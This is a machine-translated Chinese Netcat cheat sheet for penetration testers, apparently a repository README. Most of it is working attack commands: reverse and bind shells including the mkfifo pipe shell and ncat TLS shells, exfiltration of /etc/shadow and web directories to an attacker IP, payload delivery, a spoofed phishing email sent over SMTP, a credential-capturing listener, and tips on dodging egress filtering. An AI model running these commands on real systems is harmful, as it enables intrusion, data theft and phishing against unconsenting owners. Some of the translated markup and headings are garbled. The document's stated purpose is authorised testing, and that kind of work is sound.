<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔌 Netcat (nc) - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
  ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
  ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
       The TCP/IP Swiss Army Knife for Pentesters & Sysadmins
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="利用与贝壳">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="协议 TCP/UDP">
  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="许可证">
</p>

<p对齐=“中心”>
  <b>🌐使用 TCP 和 UDP 协议跨网络连接读取和写入原始数据</b>
</p>

---

## 📋 目录

- [概述和 Netcat 哲学](#-overview--the-netcat-philosophy)
- [Netcat 变体和风味困境](#-netcat-variants--the-flavor-dilemma)
  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
  - [传统 Netcat (`nc.traditional`)](#traditional-netcat-nctraditional)
  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
- [工具比较：Netcat 变体与 Socat](#-tool-comparison-netcat-variants-vs-socat)
- [安装和切换变体](#-installation--switching-variants)
- [核心命令行标志](#-core-command-line-flags)
- [端口扫描和横幅抓取](#-port-scanning--banner-grabbing)
- [反转并绑定 Shell](#-reverse--bind-shells)
  - [传统 Shell 执行 (`-e`)](#traditional-shell-execution--e)
  - [OpenBSD FIFO 命名管道反向 Shell](#openbsd-fifo-named-pipe-reverse-shell)
  - [OpenBSD FIFO 绑定 Shell](#openbsd-fifo-bind-shell)
  - [使用 Ncat 加密 TLS Shell (`--ssl`)](#encrypted-tls-shell-with-ncat---ssl)
- [文件传输技术](#-file-transfer-techniques)
  - [攻击者目标（渗透）](#target-to-attacker-exfiltration)
  - [攻击者到目标（有效负载交付）](#attacker-to-target-payload-delivery)
  - [即时目录归档 (`tar + nc`)](#on-the-fly-directory-archiving-tar--nc)
- [端口转发和网络中继](#-port-forwarding--network-relays)
- [Web 服务器和蜜罐仿真](#-web-server--honeypot-emulation)
- [网络调试&手动协议交互](#-network-debugging--manual-protocol-interaction)
- [快速参考表](#-quick-reference-table)
- [防御考虑因素和 OPSEC](#-defective-considerations--opsec)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和 Netcat 哲学

**Netcat**（通常简称为 `nc`）最初由 **Hobbit** 于 1995 年创作，在网络安全和 Unix 社区中被誉为 **“TCP/IP 瑞士军刀”**。 

与高级应用程序协议或臃肿的管理工具不同，Netcat 在一件事情上做得非常好：**它通过 TCP 或 UDP 套接字打开原始字节级网络管道，并将它们直接连接到标准输入 (`stdin`) 和标准输出 (`stdout`)**。

无论您是侦听反向 shell、建立隐蔽的渗透通道、横幅抓取服务、在没有 SMB/FTP 的情况下传输文件，还是诊断防火墙数据包过滤，Netcat 仍然是每个安全从业者的武器库中不可或缺的实用程序。

---

## ⚖️ Netcat 变体和风味困境

渗透测试和 CTF 挑战期间最常见的混淆来源之一是**多个不同的实现共享 `nc` 命令**。了解您正在与之交互的变体决定了语法和有效负载的可能性。
```
+-------------------------------------------------------------------------+
|                              The nc Command                             |
+------------------------------------+------------------------------------+
|                                    |                                    |
|             Debian / Ubuntu        |               CentOS / RHEL        |
|             (Default: OpenBSD)     |               (Default: Ncat)      |
+------------------+-----------------+------------------+-----------------+
                   |                                    |
     +-------------+-------------+                      |
     |                           |                      |
[netcat-openbsd]       [netcat-traditional]          [ncat]
(No -e compile flag)   (GAPING_SECURITY_HOLE)   (Nmap Project / SSL)
```
### OpenBSD Netcat (`nc.openbsd`)
- **默认：** Kali Linux、Debian、Ubuntu、Linux Mint。
- **关键特征：** 默认情况下，在不使用 `-e`（执行程序）标志的情况下进行编译，以防止微不足道的任意代码执行漏洞。
- **识别语法：**
  ```bash
  nc -h 2>&1 | grep -i "OpenBSD"
  # Output: OpenBSD netcat (Debian patchlevel ...)
  ```
- **Shell 执行解决方法：** 使用 Linux 命名管道 (`mkfifo`) 将 `stdin` 和 `stdout` 桥接回 `/bin/sh`。

### 传统 Netcat (`nc.traditional`)
- **原作者：** 霍比特人 (v1.10)。
- **关键特征：** 使用 `-DGAPING_SECURITY_HOLE` 指令编译，允许本机 `-e` / `-c` 标志 (`nc -e /bin/bash`)。
- **识别语法：**
  ```bash
  nc -h 2>&1 | grep -i "GAPING"
  ```
### Nmap Ncat (`ncat`)
- **维护者：** Gordon Lyon (Fyodor) / Nmap 项目。
- **关键特征：** 现代重写支持 **TLS/SSL 加密**、IP 访问控制列表（`--allow`、`--deny`）、连接代理（`--broker`）、SOCKS4/5 代理和跨平台本机执行。

---

## ⚖️ 工具比较：Netcat 变体与 Socat

|特色 | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmap) | `socat` |
|---------|------------------|----------------------|----------------|---------|
| **可执行标志（`-e`）** | ❌ 脱光| ✅ 原生 (`-e`) | ✅ 原生（`-e`、`--exec`）| ✅ 原生 (`EXEC:`) |
| **SSL / TLS 加密** | ❌ 否 | ❌ 否 | ✅ 原生 (`--ssl`) | ✅ 原生 (`OPENSSL:`) |
| **先进先出管壳** | ✅ 是 (`mkfifo`) | ✅ 是的 | ✅ 是的 | ✅ 是的 |
| **端口扫描模式** | ✅ 是 (`-z`) | ✅ 是 (`-z`) | ❌ 否 | ❌ 否 |
| **持久的倾听者** | ✅ 是 (`-k`) | ❌ 否（断开连接时退出）| ✅ 是（`-k`、`--keep-open`）| ✅ 是 (`fork`) |
| **IPv6 支持** | ✅ 原生 (`-6`) | ❌ 有限| ✅ 原生 (`-6`) | ✅ 本地人 |
| **代理/SOCKS 客户端** | ✅ 是（`-X`、`-x`）| ❌ 否 | ✅ 是 (`--proxy`) | ✅ 全面代理支持 |
| **多客户端聊天/经纪人**| ❌ 否 | ❌ 否 | ✅ 原生 (`--broker`) | ❌ 手动设置 |
| **Kali / Debian 上的默认设置** | ✅ 是 (`/bin/nc`) | 🔄 可用 (`apt`) | 🔄 可用 (`ncat`) | 🔄 可用 (`socat`) |

---

## 📥 安装和切换变体

在基于 Debian 的发行版（包括 Kali Linux）上，您可以安装所有版本并通过 `update-alternatives` 在它们之间切换：
```bash
# Install all Netcat implementations
sudo apt update
sudo apt install -y netcat-openbsd netcat-traditional ncat socat

# Check current default alternative
readlink -f /bin/nc

# Switch default nc binary interactively
sudo update-alternatives --config nc
```
要显式执行特定变体而不更改系统范围的默认值：
```bash
# Invoke OpenBSD variant directly
nc.openbsd -lvnp 4444

# Invoke Traditional variant directly
nc.traditional -lvnp 4444 -e /bin/bash

# Invoke Nmap Ncat
ncat -lvnp 4444 --ssl
```
---

## ⚙️ 核心命令行标志

|旗帜|含义及描述 |
|------|------------------------|
| `-l` | **侦听模式**：等待入站连接而不是启动出站连接。 |
| `-v` | **详细模式**：打印详细的连接和诊断信息（`-vv` 表示更详细）。 |
| `-n` | **纯数字 IP**：禁用反向 DNS 解析以提高速度和隐蔽性。 |
| `-p <port>` | **本地端口**：指定要绑定或侦听的本地端口。 |
| `-u` | **UDP模式**：使用UDP协议代替默认的TCP流。 |
| `-k` | **保持监听**：客户端断开连接后继续监听并接受新连接。 |
| `-w <sec>` | **超时**：连接建立和空闲套接字读取的超时（以秒为单位）。 |
| `-z` | **零I/O模式**：扫描模式；握手后不发送有效负载数据并立即关闭套接字。 |
| `-q <sec>` | **EOF 后退出**：在 `stdin` 上收到 EOF 后等待指定秒数，然后终止。 |
| `-s <ip>`| **源IP**：绑定到特定的本地接口/源IP地址。 |
| `-4` / `-6` |强制仅使用 IPv4 或 IPv6 寻址。 |

---

## 🔍 端口扫描和横幅抓取

虽然 `nmap` 或 `masscan` 等专用工具是全面扫描的首选工具，但 Netcat 在您登陆受限目标时提供即时、零依赖的端口检查。

### 快速端口扫描
```bash
# TCP Port Scan on a specific port range (Zero-I/O, numeric, 1s timeout)
nc -zvn -w 1 192.168.1.100 20-100

# Scan specific common service ports
nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389

# Scan UDP Ports (DNS, SNMP, NTP)
nc -zvun -w 2 10.10.10.50 53 161 123
```
### 服务横幅抓取

横幅抓取从远程守护进程中提取原始版本字符串以进行漏洞识别：
```bash
# Banner grab an SSH daemon
nc -vn 10.10.10.10 22

# Banner grab an FTP server
nc -vn 10.10.10.10 21

# Banner grab an SMTP mail server
nc -vn 10.10.10.10 25

# Manual HTTP HEAD / GET request
printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
```
---

## 💀 反转并绑定 Shell

通过 Netcat 套接字连接远程命令解释器（`/bin/sh`、`/bin/bash`、`cmd.exe`）是最基本的渗透测试技术之一。

### 传统 Shell 执行 (`-e`)

如果目标系统安装了具有执行支持的 `netcat-traditional` 或 `ncat`：
```bash
# 1. Attacker sets up a listener
nc -lvnp 4444

# 2. Target sends a reverse shell (Linux)
nc.traditional 10.10.14.5 4444 -e /bin/bash

# Target sends a reverse shell (Windows)
nc.exe 10.10.14.5 4444 -e cmd.exe

# Bind Shell (Target listens, attacker connects)
# On Target:
nc.traditional -lvnp 8888 -e /bin/bash
# On Attacker:
nc -vn 10.10.10.50 8888
```
### OpenBSD FIFO 命名管道反向 Shell

在现代 Debian、Ubuntu、Kali 和 Fedora 发行版上，`nc` 缺少 `-e` 标志。使用 **FIFO（先进先出）命名管道** 重定向标准输入和标准输出：
```bash
# 1. Attacker sets up listener
nc -lvnp 4444

# 2. Target executes named pipe reverse shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```
#### FIFO 管道的工作原理：
1. `rm -f /tmp/f`：删除任何过时的管道文件。
2. `mkfifo /tmp/f`：在`/tmp` 中创建一个特殊的命名FIFO 管道。
3. `cat /tmp/f`：读取传递到管道中的输入并将其转发到 `/bin/sh -i`。
4. `| /bin/sh -i 2>&1`：生成交互式 shell，将标准错误 (`stderr`) 重定向到标准输出 (`stdout`)。
5. `| nc 10.10.14.5 4444 >/tmp/f`：通过网络将 shell 输出传递给攻击者，同时将接收到的网络击键写回 `/tmp/f`。

### OpenBSD FIFO 绑定外壳

当目标具有可路由的公共或本地 IP 并且入站防火墙规则允许流量时：
```bash
# On Victim / Target machine:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f

# On Attacker machine:
nc -vn 10.10.10.50 8888
```
### 使用 Ncat 加密 TLS Shell (`--ssl`)

未加密的 Netcat 流量可以通过 IDS/IPS 和网络窃听器进行检查。 `ncat`原生支持TLS/SSL加密：
```bash
# 1. Attacker sets up an SSL encrypted listener
ncat --ssl -lvnp 4444

# 2. Victim connects with an encrypted reverse shell
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# SSL listener with IP Access Control (Whitelisting attacker IP only)
ncat --ssl -lvnp 4444 --allow 10.10.14.5
```
---

## 📁 文件传输技术

当 SSH、SCP、FTP 和 SMB 被阻止或卸载时，Netcat 可通过任何开放的 TCP 端口提供即时、双向文件传输管道。

### 目标攻击者（渗透）
```bash
# 1. Attacker opens a listener and redirects incoming stream to a local file
nc -lvnp 9001 > loot_passwords.txt

# 2. Target reads sensitive file and sends it to attacker's listener
nc -vn 10.10.14.5 9001 < /etc/shadow
```
### 攻击者到目标（有效负载交付）
```bash
# 1. Attacker hosts the payload file on a listener
nc -lvnp 9001 < linpeas.sh

# 2. Target connects and saves the stream to disk
nc -vn 10.10.14.5 9001 > linpeas.sh
```
### 完整性验证（校验和）

在原始 Netcat 传输后始终验证字节完整性：
```bash
# Calculate MD5 on both source and destination machines
md5sum transferred_file.tar.gz
```
### 即时目录归档 (`tar + nc`)

传输整个目录结构，而不在受害者的磁盘上创建中间临时存档文件：
```bash
# 1. Attacker listens and extracts incoming tar stream directly
nc -lvnp 9001 | tar -xzvf - -C /opt/loot/

# 2. Target compresses and streams directory across the wire
tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
```
---

## 🔀 端口转发和网络中继

Netcat 可以充当轻量级网络中继，无需 SSH 端口转发：
```bash
# Relay traffic arriving on Port 8080 to an internal database on 192.168.20.10:3306
rm -f /tmp/relay; mkfifo /tmp/relay
nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
```
---

## 🌐 Web 服务器和蜜罐模拟

### 极简单文件 HTTP 服务器

提供静态 HTTP 有效负载或捕获浏览器提交的凭据：
```bash
# One-shot HTTP response
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80

# Continuous loop HTTP server (captures POST credentials and browser headers)
while true; do
  printf "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 17\r\n\r\nCaptured Request!" | \
  nc -lvnp 8080
done
```
### 多客户端聊天/消息代理 (`ncat`)

Ncat 包含内置经纪人模式，为红队操作员创建一个类似于 IRC 的临时中继室：
```bash
# Attacker runs broker on port 5555
ncat -lvnp 5555 --broker

# Multiple operators connect and broadcast messages to each other
ncat 10.10.14.5 5555
```
---

## 🛠️ 网络调试和手动协议交互

### 原始 SMTP 邮件注入
```bash
nc -vn mail.target.local 25 <<EOF
HELO attacker.local
MAIL FROM:<admin@target.local>
RCPT TO:<victim@target.local>
DATA
Subject: Critical Security Patch

Please follow the attachment instructions.
.
QUIT
EOF
```
### 原始 POP3 邮件检索
```bash
nc -vn mail.target.local 110
# Server replies: +OK POP3 server ready
USER testuser
# Server replies: +OK
PASS SecretPassword123
# Server replies: +OK User logged in
STAT
RETR 1
QUIT
```
---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **标准监听器** | `nc -lvnp <PORT>` |
| **持久的倾听者** | `nc -lvnp <PORT> -k` |
| **连接到远程主机** | `nc -vn <HOST> <PORT>` |
| **通过 UDP 连接** | `nc -u -vn <HOST> <PORT>` |
| **端口扫描 TCP（快速）** | `nc -zvn -w 1 <HOST> <START>-<END>` |
| **端口扫描 UDP** | `nc -zvun -w 2 <HOST> <PORT>` |
| **OpenBSD 命名管道外壳** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
| **传统外壳 (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
| **加密 SSL Shell (`ncat`)**| `ncat --ssl <IP> <PORT> -e /bin/bash`|
| **接收文件（Exfil 侦听器）**| `nc -lvnp <PORT> > output_file`|
| **发送文件（Exfil 发件人）** | `nc -vn <IP> <PORT> < input_file` |
| **通过 Tar 传输文件夹** | `tar -czvf - /path \| nc -vn <IP> <PORT>` |
| **提取流文件夹** | `nc -lvnp <PORT> \| tar -xzvf -` |
| **抓取横幅** | `nc -vn -w 2 <HOST> <PORT>`|

---

## 🛡️ 防御考虑和 OPSEC

1. **未加密的明文警告：**
   - 标准 Netcat **不** 采用加密封装。通过明文 `nc` 发送的任何密码、会话令牌或 shell 命令都可以由网络安全监控 (NSM) 传感器（Zeek、Suricata、Wireshark）提取。
   - 尽可能使用 `ncat --ssl` 或将流量包装在 SSH/TLS 隧道内。
2. **流程审计和Sysmon：**
   - 在 Linux 系统上，进程执行日志记录（`auditd`、eBPF、Falco）会标记 `nc` 的调用，其中包含 `-e` 等标记或创建 `/tmp/f` 和 `mkfifo` 的命令。
   - 在 Windows 上，EDR 代理会根据已知的静态签名定期标记或隔离 `nc.exe` 二进制文件。
3. **防火墙入站限制：**
   - 配置反向 shell 侦听器时，始终选择常用出站端口（`80`、`443`、`53`），以规避严格的出口过滤策略。

---

## ⚠️ 法律免责声明

> [!警告]
> 本备忘单仅供授权渗透测试、漏洞评估、CTF 竞赛和系统管理之用。未经明确书面同意，拦截网络流量、窃取数据或对系统执行反向 shell 是非法的，根据全球网络安全法将受到处罚。负责任且合乎道德地使用。